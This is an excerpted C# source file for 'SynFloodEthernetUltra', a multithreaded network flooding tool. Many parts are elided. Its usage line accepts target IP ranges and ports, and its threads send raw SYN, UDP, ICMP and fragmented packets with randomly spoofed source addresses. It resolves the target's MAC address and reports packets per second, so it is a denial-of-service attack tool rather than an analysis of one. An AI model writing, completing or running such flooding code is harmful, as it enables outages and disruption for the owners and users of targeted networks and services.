...
class SynFloodEthernetUltra
{
    ...
    static long packetsSent = 0, errors = 0;
    ...
    static byte[] RandomIPv6(Random rnd)
    {
        ...
        {
            rnd.NextBytes(ip);
            if (ip[0] != 0xFF && ip[0] >= 0x20 && ip[0] <= 0x3F) // Global Unicast
                return ip;
        }
    }
    ...
    static void Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: SynFloodEthernetUltra <interface> <TargetIP>[,TargetIP2,...] <TargetPort>[,Port2,...] [threads] [seconds] [protocols] [logfile]");
            Console.WriteLine("Protocols: ipv6, multiflood, udp, icmp, syn, frag, delay:min-maxms");
            return;
        }
        string iface = args[0];
        var dstIPs = ExpandIpList(args[1]);
        var dstPorts = ExpandPortList(args[2]);
        int threadCount = (args.Length > 3) ? int.Parse(args[3]) : Environment.ProcessorCount;
        int duration = (args.Length > 4) ? int.Parse(args[4]) : 0;
        string protocols = (args.Length > 5) ? args[5].ToLowerInvariant() : "";
        string logFile = (args.Length > 6) ? args[6] : null;
    ...
    {
        var rnd = new Random(Guid.NewGuid().GetHashCode() ^ threadId);
        ...
        while (run)
        {
            try
            {
                ...
                if (multiflood)
                {
                    ...
                    else if (protoSel == 2 && enableICMP) protoSent = SendICMP(s, eth, ip, icmp, dstIP, ifIndex, rnd, ipv6, threadId);
                }
                else if (enableSYN)
                    ...
                    protoSent = SendICMP(s, eth, ip, icmp, dstIP, ifIndex, rnd, ipv6, threadId);
    ...
    static string SendUDP(Socket s, byte[] eth, byte[] ip, byte[] udp, byte[] payload, byte[] dstIP, int dstPort, int ifIndex, Random rnd, bool ipv6, int threadId)
    {
        ...
        // IPv6 UDP omitted for brevity, can be implemented similarly
        return null;
    }

    static string SendICMP(Socket s, byte[] eth, byte[] ip, byte[] icmp, byte[] dstIP, int ifIndex, Random rnd, bool ipv6, int threadId)
    {
        if (!ipv6)
        {
            var srcIP = RandomIPv4(rnd);
        ...
        // IPv6 ICMP omitted for brevity, can be implemented similarly
        return null;
    }
    ...
    static byte[] ResolveTargetMAC(string iface, string targetIp)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo("ip", $"neigh show to {targetIp} dev {iface}")
            {
    ...
    static void ShowStats(int duration)
    {
        ...
        while (run)
        {
            ...
            lastSent = now;
            Console.Write($"\rSent: {sent:n0} | Errors: {err:n0} | PPS: {pps:n0} | Uptime: {(DateTime.Now-start):hh\\:mm\\:ss} ");
            if (duration > 0 && (DateTime.Now - start).TotalSeconds >= duration)
                run = false;
        }
    }

    // Utility: expand IP range list like 192.168.1.10-15,192.168.1.20
    ...
    // Utility: expand port range list like 80,81-85
